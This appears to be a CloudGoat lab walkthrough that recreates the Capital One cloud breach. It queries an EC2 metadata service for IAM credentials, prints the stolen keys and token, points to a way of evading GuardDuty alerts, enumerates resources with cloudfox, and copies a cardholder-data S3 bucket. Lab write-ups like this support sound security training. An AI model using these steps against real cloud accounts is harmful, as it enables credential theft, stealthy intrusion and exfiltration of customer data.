# This scenario is based on a real cloud breach regarding Capital One's 2019 data breach that affected over 100 million customers.

# This scenario starts off by providing a public IP address for the targeted EC2 instance. After querying the instance's metadata service, the credentials can be used to obtain sensitive data in S3 buckets.

[CloudGoat Scenario](https://rhinosecuritylabs.com/aws/capital-one-cloud_breach_s3-cloudgoat/)

![Scenario](cloud_breach_s3_CloudGoat_Scenario.png)

- Querying EC2 Metadata Service

`curl 34.235.170.226 `

```bash 
curl 34.235.170.226/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cloud_breach_s3_cgidacg-banking-WAF-Role-cloud_breach_s3_cgida870e58dn2
```
```json
{
  "Code" : "Success",
  "LastUpdated" : "2023-02-23T16:20:26Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAVDXKX74O76DQBCTW",
  "SecretAccessKey" : "Eafxa+VXVNrlPi0bEWscVMqCQ69w95Juppn33NgP",
  "Token" : "IQoJb3JpZ2luX2VjEFkaCXVzLWVhc3QtMSJHMEUCIDqsaaFZHk2xAFcPhhNEcYO1ltG3aFUL6g5WuaQFXrmvAiEAgae6lq1P16+79wv1uqiodOlBKeHw1XgC/hgSUSPlXFUq1QQI8f//////////ARAAGgwzNTE2MDU4ODI2NTMiDKn8T/Q/sDn1pyhpcSqpBF9mJKWUaO5aMxPl4HierRsO6fvuZa5uOEAOVJSzcT5ZDJ9qUuZCYG1Z25zzNoxnP0NgL6t01zFQY5GsjxMa3CNBjYY/Yn9N7DJUlRLQ5OvYUWzkufroUd/2ZwDuhjZpTMKHUjdmuobM78t0gMoGhsS7L1J4tDhyuTVc1VZUvpqIMvae3WJ1vwhS5p6svIT6ng2XLpZj1010f9nL3y7hiVr9KJhX6byqSRBK/fh+2+6yS1l8XSLKLQGO9hkWXdTCypB7PoXzcweX4Wltrz+8zZbU8yoOwZVC7JzY3y6hmXuJ/AwfIU77PrAfj87fz6LmfpFYdCSwjJIHJcDsUbhG0tJQb0r5/AEpfqtEkwjMVnVNrXjhMnlCNVn+cG6BXZB8AqNNgs03BWgFjEe0JIkzWLF3z7XZEMVwObtwoMXOIaWEDhmy0YYU0LyWdsOgXL75MfdJMMAsq/0XDa4auB7dFnKv2zWJ/UHRT1IqqUlc/qaCdHwCFfc6Hd/vPry/3K/xrUAv0CXV1Xt15Vr8dCVA6uVvGCHWbqnHsvpct5MPh1r7t1Qf4hhR2dAIO/r0wXe5egmLsaNIq0i/zFDjhx6Q2J3X9FFwXMZao6OCVqlRKvC7lJZdIG7Va0Onj/qxEp3bwwzNxQecdt1uGjpyMY8aMg8tRP/IG74QIlrZZwvgpdxiM7TYjIUpscHCcoc739yH+sU0bWUvF5b77nXpfaXVsUW4JOh0hoyFHoIw76TenwY6qQHk3uiUWf9IDzjeeJimCrdE18yVyfJtXaj3dnh+pv2gQsm482ZjxhhZS2PEZi+sr6RRI53jsjJHBL2m27k+WAU4AMI78hPp+tu1bDo+y5vhLsDKG6NIaTmcT8/HJxtYYwbHGv7W9GJP6PJdPQFnhWzAH+NficwvZo3OAEFRkcWs1VMV8Jl1jojMxZZuMd5nHcJIh+0PcvpR/l4GJWuooyzf+ZUJz0mq3asN",
  "Expiration" : "2023-02-23T22:49:22Z"
}
```

![breach_1](s3_breach_1.png)

```bash
aws configure --profile s3_breach

echo 'aws_session_token = IQoJb3JpZ2luX2VjEFkaCXVzLWVhc3QtMSJHMEUCIDqsaaFZHk2xAFcPhhNEcYO1ltG3aFUL6g5WuaQFXrmvAiEAgae6lq1P16+79wv1uqiodOlBKeHw1XgC/hgSUSPlXFUq1QQI8f//////////ARAAGgwzNTE2MDU4ODI2NTMiDKn8T/Q/sDn1pyhpcSqpBF9mJKWUaO5aMxPl4HierRsO6fvuZa5uOEAOVJSzcT5ZDJ9qUuZCYG1Z25zzNoxnP0NgL6t01zFQY5GsjxMa3CNBjYY/Yn9N7DJUlRLQ5OvYUWzkufroUd/2ZwDuhjZpTMKHUjdmuobM78t0gMoGhsS7L1J4tDhyuTVc1VZUvpqIMvae3WJ1vwhS5p6svIT6ng2XLpZj1010f9nL3y7hiVr9KJhX6byqSRBK/fh+2+6yS1l8XSLKLQGO9hkWXdTCypB7PoXzcweX4Wltrz+8zZbU8yoOwZVC7JzY3y6hmXuJ/AwfIU77PrAfj87fz6LmfpFYdCSwjJIHJcDsUbhG0tJQb0r5/AEpfqtEkwjMVnVNrXjhMnlCNVn+cG6BXZB8AqNNgs03BWgFjEe0JIkzWLF3z7XZEMVwObtwoMXOIaWEDhmy0YYU0LyWdsOgXL75MfdJMMAsq/0XDa4auB7dFnKv2zWJ/UHRT1IqqUlc/qaCdHwCFfc6Hd/vPry/3K/xrUAv0CXV1Xt15Vr8dCVA6uVvGCHWbqnHsvpct5MPh1r7t1Qf4hhR2dAIO/r0wXe5egmLsaNIq0i/zFDjhx6Q2J3X9FFwXMZao6OCVqlRKvC7lJZdIG7Va0Onj/qxEp3bwwzNxQecdt1uGjpyMY8aMg8tRP/IG74QIlrZZwvgpdxiM7TYjIUpscHCcoc739yH+sU0bWUvF5b77nXpfaXVsUW4JOh0hoyFHoIw76TenwY6qQHk3uiUWf9IDzjeeJimCrdE18yVyfJtXaj3dnh+pv2gQsm482ZjxhhZS2PEZi+sr6RRI53jsjJHBL2m27k+WAU4AMI78hPp+tu1bDo+y5vhLsDKG6NIaTmcT8/HJxtYYwbHGv7W9GJP6PJdPQFnhWzAH+NficwvZo3OAEFRkcWs1VMV8Jl1jojMxZZuMd5nHcJIh+0PcvpR/l4GJWuooyzf+ZUJz0mq3as' >> ~/.aws/credentials
```

```bash
aws sts get-caller-identity --profile s3_breach
```
```json
{
    "UserId": "AROAVDXKX74OYVON7EREA:i-09d837e887c1be42a",
    "Account": "351605882653",
    "Arn": "arn:aws:sts::351605882653:assumed-role/cg-banking-WAF-Role-cloud_breach_s3_cgida870e58dn2/i-09d837e887c1be42a"
}
```

- Bypassing GuardDuty Alerts

[SneakyEndpoints to hide from GuardDuty](https://github.com/Frichetten/SneakyEndpoints)

- GuardDuty Alerts Description when running `aws sts get-caller-identity` 

![GuardDuty](GuardDuty_IAM_finding_types_Amazon_GuardDuty.png)

![GuardDuty](GuardDuty_IAM_finding_types_Amazon_GuardDuty_2.png)

- Connect to an instance

```bash
aws ssm start-session --tasrget "instance id"
```

- List the inventory using cloudfox

```bash
./cloudfox aws --profile s3_breach -v2 inventory
```

![breach_2](s3_breach_2.png)

```bash
./cloudfox aws --profile s3_breach -v2 buckets
```

![breach_3](s3_breach_3.png)

```bash
aws --profile $profile s3 cp s3://cg-cardholder-data-bucket-cloud-breach-s3-cgida870e58dn2/ ./s3-buckets/cg-cardholder-data-bucket-cloud-breach-s3-cgida870e58dn2 --recursive
```

![[s3_breach_4.png]]
